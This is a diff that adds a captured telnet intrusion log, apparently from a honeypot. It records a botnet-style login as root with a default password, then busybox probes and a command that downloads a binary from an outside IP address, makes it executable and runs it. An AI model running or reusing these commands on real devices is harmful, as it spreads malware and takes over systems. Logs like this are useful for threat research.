@@ -1,0 +1,13 @@
+from: 109.105.251.136:56627 user:root password:666666
+enable
+system
+shell
+sh
+cat /proc/mounts; /bin/busybox WFJRJ
+cd /tmp; cat .s || cp /bin/echo .s; /bin/busybox WFJRJ
+tftp; wget; /bin/busybox WFJRJ
+dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
+/bin/busybox WFJRJ
+rm .s; wget http://1.32.43.154:39086/.i; chmod 777 .i; ./.i; exit
+q
+[eof]
